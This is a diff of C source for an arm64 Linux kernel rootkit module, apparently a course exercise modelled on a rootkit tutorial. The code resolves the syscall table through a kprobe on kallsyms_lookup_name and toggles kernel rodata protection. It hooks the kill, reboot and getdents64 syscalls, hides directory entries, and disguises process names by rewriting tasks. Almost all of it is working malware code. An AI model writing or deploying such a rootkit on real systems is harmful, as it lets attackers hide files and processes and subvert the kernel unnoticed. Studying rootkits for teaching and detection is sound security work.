@@ -44,20 +44,44 @@ static struct kprobe kp = {
 	.symbol_name = "kallsyms_lookup_name",
 };
 
+//
+// static struc kprobe kp_getdents64 = {
+// 	.symbol_name = "sys_getdents64",
+// };
+
+// static struct kprobe kp_kill = {
+// 	.symbol_name = "__arm64_sys_kill",
+// };
+
+// static struct kprobe kp_reboot = {
+// 	.symbol_name = "sys_reboot",
+// };
+
 static unsigned long *get_syscall_table(void)
 {
 	unsigned long *syscall_table;
+	// unsigned long *kill_addr;
 	typedef unsigned long (*kallsyms_name)(const char *name);
-	kallsyms_name kallsyms_lookup_name;
-	register_kprobe(&kp);
-	kallsyms_lookup_name = (kallsyms_name)kp.addr;
-	unregister_kprobe(&kp);
+	// typedef unsigned long (*kill_addr_t)(const char *name);
 
+	kallsyms_name kallsyms_lookup_name;
+	// kill_addr_t sys_kill;
+	register_kprobe(&kp);
+	// register_kprobe(&kp_kill);
+	kallsyms_lookup_name = (kallsyms_name)kp.addr;
+	// sys_kill = (kill_addr_t)kp_kill.addr;
+	unregister_kprobe(&kp);
+	// unregister_kprobe(&kp_kill);
+
+	// get the syscall table and some
+	// kill_addr = (unsigned long *)kallsyms_lookup_name("__arm64_sys_kill");
 	syscall_table = (unsigned long *)kallsyms_lookup_name("sys_call_table");
 	update_mapping_prot = (void *)kallsyms_lookup_name("update_mapping_prot");
 	start_rodata = (unsigned long)kallsyms_lookup_name("__start_rodata");
 	init_begin = (unsigned long)kallsyms_lookup_name("__init_begin");
 
+	// printk(KERN_INFO "sys_kill at: %p\n", sys_kill);
+	// printk(KERN_INFO "kill_addr at: %p\n", kill_addr);
 	printk(KERN_INFO "sys_call_table at: %p\n", syscall_table);
 	printk(KERN_INFO "update_mapping_prot at: %p\n", update_mapping_prot);
 	printk(KERN_INFO "start_rodata: %lx\n", start_rodata);
@@ -95,12 +119,12 @@ static asmlinkage int hook_kill(const struct pt_regs *regs)
 	return orig_kill(regs);
 }
 
-// hook getdents64
+// hook getdents64 ：參考https://xcellerator.github.io/posts/linux_rootkits_06/
 asmlinkage int hook_getdents64(const struct pt_regs *regs)
 {
 	struct linux_dirent64 __user *dirent = (struct linux_dirent64 *)regs->regs[1];
 	long error;
-	/* Declare the previous_dir struct for book-keeping */
+
 	struct linux_dirent64 *previous_dir, *current_dir, *dirent_ker = NULL;
 	unsigned long offset = 0;
 
@@ -161,13 +185,11 @@ static inline void protect_memory(void)
 {
 	// physical address of the start of the rodata section
 	update_mapping_prot(__pa_symbol(start_rodata), (unsigned long)start_rodata, init_begin - start_rodata, pgprot_val(PAGE_KERNEL_RO));
-	printk(KERN_INFO "Protected\n");
 }
 
 static inline void unprotect_memory(void)
 {
 	update_mapping_prot(__pa_symbol(start_rodata), (unsigned long)start_rodata, init_begin - start_rodata, pgprot_val(PAGE_KERNEL));
-	printk(KERN_INFO "Unprotected\n");
 }
 //-----------------------------------------------------------------------------------
 
@@ -198,10 +220,7 @@ static long rootkit_ioctl(struct file *filp, unsigned int ioctl, unsigned long a
 			break;
 		}
 
-		// print __NR_xxxx number
-		printk(KERN_INFO "kill: %d\n", __NR_kill);
-		printk(KERN_INFO "reboot: %d\n", __NR_reboot);
-		printk(KERN_INFO "getdents64: %d\n", __NR_getdents64);
+		// save the original syscall
 		orig_kill = (orgin_syscall)__sys_call_table[__NR_kill];
 		orig_reboot = (orgin_syscall)__sys_call_table[__NR_reboot];
 		orig_getdents64 = (orgin_syscall)__sys_call_table[__NR_getdents64];
@@ -265,9 +284,6 @@ static long rootkit_ioctl(struct file *filp, unsigned int ioctl, unsigned long a
 		// Iterate through the masq_proc array
 		for (i = 0; i < req.len; i++)
 		{
-			// Here you should implement the logic to check if the process with orig_name exists,
-			// and if the new_name string length is shorter than the orig_name, then masquerade the process name.
-			// This part is left as an exercise.
 			struct task_struct *task;
 			for_each_process(task)
 			{
@@ -356,7 +372,7 @@ static void __exit rootkit_exit(void)
 {
 	// TODO: unhook syscall
 	unprotect_memory();
-
+	// restore the original syscall
 	__sys_call_table[__NR_kill] = (unsigned long)orig_kill;
 	__sys_call_table[__NR_reboot] = (unsigned long)orig_reboot;
 	__sys_call_table[__NR_getdents64] = (unsigned long)orig_getdents64;
